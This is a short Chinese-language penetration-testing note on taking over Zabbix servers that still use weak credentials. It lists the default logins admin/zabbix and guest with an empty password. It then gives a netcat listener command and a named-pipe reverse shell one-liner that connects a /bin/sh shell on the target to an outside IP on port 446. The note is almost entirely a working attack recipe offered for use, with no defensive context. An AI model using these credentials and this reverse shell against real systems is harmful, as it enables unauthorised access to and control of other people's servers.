## zabbix弱口令getshell

#### 默认口令
	admin/zabbix  guest/空密码

#### getshell
	vps监听端口
	nc -lvvp 446

	mknod /tmp/backpipe p && /bin/sh 0</tmp/backpipe | nc 12.25.204.49 446 1>/tmp/backpipe && echo $0

![shiro_01](1.jpg)


![shiro_01](2.jpg)
